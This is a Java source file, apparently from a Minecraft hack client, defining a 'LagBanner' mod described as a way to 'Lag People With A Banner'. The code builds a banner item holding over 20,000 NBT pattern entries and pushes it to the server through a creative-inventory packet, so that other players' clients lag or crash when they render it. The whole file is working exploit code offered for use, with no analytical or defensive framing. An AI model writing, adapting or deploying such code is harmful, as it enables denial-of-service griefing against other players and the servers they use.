package net.yawk.client.mods.building;

import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.ChatComponentTranslation;
import net.yawk.client.Client;
import net.yawk.client.modmanager.Mod;
import net.yawk.client.modmanager.RegisterMod;

@RegisterMod(name = "LagBanner", desc = "Lag People With A Banner", type = Mod.Type.BUILDING)
public class BannerLag extends Mod{

	Minecraft mc = Minecraft.getMinecraft();

	public BannerLag(){
		
	}

	@Override
	public void onEnable()
	{
		if(Minecraft.getMinecraft().thePlayer.inventory.getStackInSlot(0) != null)
		{
			mc.thePlayer.addChatComponentMessage(new ChatComponentTranslation("[LagBanner] Please clear the first slot in your hotbar."));
			setEnabled(false);
			return;
		}else if(!Minecraft.getMinecraft().thePlayer.capabilities.isCreativeMode)
		{
			mc.thePlayer.addChatComponentMessage(new ChatComponentTranslation("[LagBanner] Creative mode only."));
			setEnabled(false);
			return;
		}
	    ItemStack item = new ItemStack(Items.banner, 1);
	    
	    NBTTagCompound nbtEntity = new NBTTagCompound();
	    item.setTagInfo("BlockEntityTag", nbtEntity);
	    
	    NBTTagCompound nbtBefehl = new NBTTagCompound();
	    NBTTagList patternList = new NBTTagList();
	    for (int i = 0; i < 20000; i++)
	    {
	      nbtBefehl.setInteger("Color", new Random().nextInt(4));
	      nbtBefehl.setString("Pattern", "sc");
	      patternList.appendTag(nbtBefehl);
	      nbtBefehl = new NBTTagCompound();
	    }
	    nbtBefehl.setInteger("Color", 8);
	    nbtBefehl.setString("Pattern", "b");
	    patternList.appendTag(nbtBefehl);
	    nbtBefehl = new NBTTagCompound();
	    
	    nbtBefehl.setInteger("Color", 0);
	    nbtBefehl.setString("Pattern", "flo");
	    patternList.appendTag(nbtBefehl);
	    nbtBefehl = new NBTTagCompound();
	    
	    nbtEntity.setTag("Patterns", patternList);
	    
	    item.setTagInfo("BlockEntityTag", nbtEntity);
	  
		item.setStackDisplayName("§a§lYouShouldntBeAble2SeeThis");
		Minecraft.getMinecraft().thePlayer.sendQueue
			.addToSendQueue(new C10PacketCreativeInventoryAction(36, item));
		mc.thePlayer.addChatComponentMessage(new ChatComponentTranslation("[LagBanner] Banner created."));
		setEnabled(false);
	}
}